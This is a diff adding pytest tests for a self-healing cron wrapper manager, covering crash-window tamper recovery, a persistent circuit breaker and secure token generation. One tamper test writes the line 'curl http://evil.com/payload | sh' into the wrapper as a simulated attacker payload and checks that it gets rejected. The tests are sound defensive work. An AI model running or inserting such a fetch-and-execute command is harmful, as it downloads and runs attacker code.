@@ -1531,6 +1531,140 @@ def test_breaker_lock_not_held_across_io(tmp_path):
     assert all(lock_checks), "Circuit lock was held during blocking os.write I/O!"
 
 
+def test_recovery_rejects_tampered_wrapper_in_crash_window(tmp_path, caplog):
+    """CWE-347 / CWE-494: Attacker tampering in crash window is detected and overwritten with authoritative bytes."""
+    SelfHealingManager.reset_circuit_breaker()
+    import logging
+    scripts_dir = tmp_path / "scripts_tamper_crash_window"
+    scripts_dir.mkdir(parents=True, exist_ok=True)
+    mgr = SelfHealingManager(
+        jobs_path=tmp_path / "jobs.json",
+        repo_dir=tmp_path / "repo",
+        scripts_dir=scripts_dir,
+    )
+
+    orig_replace = os.replace
+
+    class SimulatedCrash(RuntimeError):
+        pass
+
+    # Inject crash right after wrapper replace succeeds, but before manifest replace
+    def crash_after_wrapper_replace(src, dst, *args, **kwargs):
+        res = orig_replace(src, dst, *args, **kwargs)
+        if dst == "hermes_hourly_digest.sh":
+            raise SimulatedCrash("Process killed / power outage between replaces")
+        return res
+
+    with patch("os.replace", side_effect=crash_after_wrapper_replace):
+        with pytest.raises(SimulatedCrash):
+            mgr.ensure_wrapper_script()
+
+    wrapper_path = scripts_dir / "hermes_hourly_digest.sh"
+    manifest_path = scripts_dir / ".hermes_hourly_digest.sh.manifest"
+    assert wrapper_path.exists()
+    assert not manifest_path.exists()
+
+    # Attacker injects malicious payload into the manifest-less wrapper during crash window:
+    wrapper_path.write_text("#!/bin/sh\ncurl http://evil.com/payload | sh\n", encoding="utf-8")
+
+    # Reset circuit breaker to simulate a new cron process run
+    SelfHealingManager.reset_circuit_breaker()
+
+    # Recovery must REJECT adopting the attacker's bytes, log tamper event, and overwrite from authoritative render!
+    with caplog.at_level(logging.WARNING):
+        wp, digest = mgr.ensure_wrapper_script()
+
+    # 1. Attacker's code must NOT be present!
+    recovered_text = wrapper_path.read_text(encoding="utf-8")
+    assert "evil.com" not in recovered_text, "CRITICAL: Attacker tampered bytes were adopted by self-heal!"
+    assert "tools/hourly_digest_monitor.py" in recovered_text
+
+    # 2. Manifest exists and sha256sum passes against authoritative bytes
+    assert manifest_path.exists()
+    res = subprocess.run(
+        ["sha256sum", "-c", manifest_path.name],
+        cwd=scripts_dir,
+        capture_output=True,
+        text=True,
+    )
+    assert res.returncode == 0
+
+    # 3. SIEM tamper detection log was emitted
+    tamper_events = [
+        json.loads(r.message) for r in caplog.records
+        if "wrapper_tamper_detected" in r.message
+    ]
+    assert len(tamper_events) >= 1
+    assert tamper_events[0]["event"] == "wrapper_tamper_detected"
+
+
+def test_circuit_breaker_persists_across_process_restart(tmp_path):
+    """CWE-362 / Cron DoS Defense: Circuit breaker trips latched to persistent ledger across process restarts."""
+    state_file = tmp_path / "test_circuit_state.json"
+    SelfHealingManager.set_circuit_state_file(state_file)
+    SelfHealingManager.reset_circuit_breaker()
+
+    scripts_dir = tmp_path / "scripts_persist_breaker"
+    scripts_dir.mkdir(parents=True, exist_ok=True)
+    mgr = SelfHealingManager(
+        jobs_path=tmp_path / "jobs.json",
+        repo_dir=tmp_path / "repo",
+        scripts_dir=scripts_dir,
+    )
+
+    # Inject fatal errno (ENOSPC) on replace
+    def failing_replace(*args, **kwargs):
+        raise OSError(errno.ENOSPC, "Persistent disk full error")
+
+    with patch("os.replace", side_effect=failing_replace):
+        for _ in range(SelfHealingManager.CIRCUIT_MAX_FAILURES):
+            with pytest.raises(OSError, match="Persistent disk full error"):
+                mgr.ensure_wrapper_script()
+
+    # Verify persistent ledger file was created on disk
+    assert state_file.exists(), "Persistent circuit state file was not created on disk!"
+    with open(state_file, "r", encoding="utf-8") as fh:
+        saved_state = json.load(fh)
+    assert saved_state["errno"] == errno.ENOSPC
+    assert saved_state["circuit_open_until"] > time.time()
+
+    # Simulate a BRAND NEW process invocation (memory reset, fresh instance)
+    with SelfHealingManager._circuit_lock:
+        SelfHealingManager._wrapper_failures = 0
+        SelfHealingManager._wrapper_circuit_open_until = 0.0
+
+    new_mgr = SelfHealingManager(
+        jobs_path=tmp_path / "jobs.json",
+        repo_dir=tmp_path / "repo",
+        scripts_dir=scripts_dir,
+    )
+
+    # Must immediately refuse with circuit breaker OPEN from persistent ledger without touching disk
+    with pytest.raises(RuntimeError, match="Wrapper reconciliation circuit breaker OPEN.*persistent failure"):
+        new_mgr.ensure_wrapper_script()
+
+    # Reset cleans up persistent ledger and restores execution
+    SelfHealingManager.reset_circuit_breaker()
+    assert not state_file.exists()
+    wp, _ = new_mgr.ensure_wrapper_script()
+    assert wp.exists()
+
+    # Clean up static path override
+    SelfHealingManager.set_circuit_state_file(None)
+
+
+def test_token_source_is_csprng_default():
+    """CWE-330: _token_source defaults to high-entropy cryptographic CSPRNG secrets.token_hex."""
+    t1 = SelfHealingManager._token_source(16)
+    t2 = SelfHealingManager._token_source(16)
+    assert len(t1) == 32
+    assert len(t2) == 32
+    assert t1 != t2
+    # Verify hex format
+    assert re.fullmatch(r"[0-9a-f]{32}", t1) is not None
+    assert re.fullmatch(r"[0-9a-f]{32}", t2) is not None
+
+
 
 
 
